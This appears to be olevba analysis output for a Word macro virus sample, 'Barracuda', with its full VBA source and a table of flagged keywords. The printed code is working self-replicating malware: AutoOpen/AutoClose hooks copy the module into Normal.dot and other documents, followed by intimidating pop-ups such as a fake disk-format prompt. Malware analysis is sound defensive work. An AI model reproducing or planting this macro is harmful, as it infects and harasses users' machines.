olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Barracuda
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Barracuda - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO barracuda.bas 
in file: Virus.MSWord.Barracuda - OLE stream: 'Macros/VBA/barracuda'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub autoclose()
autoopen
End Sub
Public Sub autoopen()
' áàððàêóäà âåð 1.0 for KOSTIK PUSKU ADMIN
Dim d
d = ThisDocument.Name
If d = "Normal.dot" Then
NormalTemplate.VBProject.VBComponents("barracuda").export ("c:\b.sys")
ActiveDocument.VBProject.VBComponents.Import ("c:\b.sys")
Kill ("c:\b.sys")
End If
If d <> "Normal.dot" Then
ThisDocument.VBProject.VBComponents("barracuda").export ("c:\b.sys")
NormalTemplate.VBProject.VBComponents.Import ("c:\b.sys")
Kill ("c:\b.sys")
End If
Dim d_
d_ = Time
If d_ > "19:19:19" Then
    MsgBox "Àäìèíèñòðàòîð çàïðåòèë ðàáîòàòü ñ äîêóìåíòàìè ïîñëå 19:00 ÷àñîâ", vbOKOnly + vbCritical, "ÏÓÑÊÓ Àäìèíèñòðàòîð"
End If
If d_ > "20:00:00" Then
    MsgBox "Ôîðìàòèðîâàòü äèñê C: ?", vbInformation + vbOKOnly, "ÏÓÑÊÓ ÀÄÌÈÍÈÑÒÐÀÒÎÐ"
End If
If d_ > "20:01:00" Then
    MsgBox "Áûñòðî âûêëþ÷èë êîìïüþòåð è ïîêèíóë àóäèòîðèþ!", vbOKOnly + vbExclamation, "ADMIN.PCI.ORG.UA"
End If

If d_ > "20:02:00" Then
    MsgBox "ß íå ÿñíî ñêàçàë??!", vbOKOnly + vbExclamation, "ADMIN.PCI.ORG.UA"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO barracuda1.bas 
in file: Virus.MSWord.Barracuda - OLE stream: 'Macros/VBA/barracuda1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub autoclose()
autoopen
End Sub
Public Sub autoopen()
' áàððàêóäà âåð 1.0 for KOSTIK PUSKU ADMIN
Dim d
d = ThisDocument.Name
If d = "Normal.dot" Then
NormalTemplate.VBProject.VBComponents("barracuda").export ("c:\b.sys")
ActiveDocument.VBProject.VBComponents.Import ("c:\b.sys")
Kill ("c:\b.sys")
End If
If d <> "Normal.dot" Then
ThisDocument.VBProject.VBComponents("barracuda").export ("c:\b.sys")
NormalTemplate.VBProject.VBComponents.Import ("c:\b.sys")
Kill ("c:\b.sys")
End If
Dim d_
d_ = Time
If d_ > "19:19:19" Then
    MsgBox "Àäìèíèñòðàòîð çàïðåòèë ðàáîòàòü ñ äîêóìåíòàìè ïîñëå 19:00 ÷àñîâ", vbOKOnly + vbCritical, "ÏÓÑÊÓ Àäìèíèñòðàòîð"
End If
If d_ > "20:00:00" Then
    MsgBox "Ôîðìàòèðîâàòü äèñê C: ?", vbInformation + vbOKOnly, "ÏÓÑÊÓ ÀÄÌÈÍÈÑÒÐÀÒÎÐ"
End If
If d_ > "20:01:00" Then
    MsgBox "Áûñòðî âûêëþ÷èë êîìïüþòåð è ïîêèíóë àóäèòîðèþ!", vbOKOnly + vbExclamation, "ADMIN.PCI.ORG.UA"
End If

If d_ > "20:02:00" Then
    MsgBox "ß íå ÿñíî ñêàçàë??!", vbOKOnly + vbExclamation, "ADMIN.PCI.ORG.UA"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

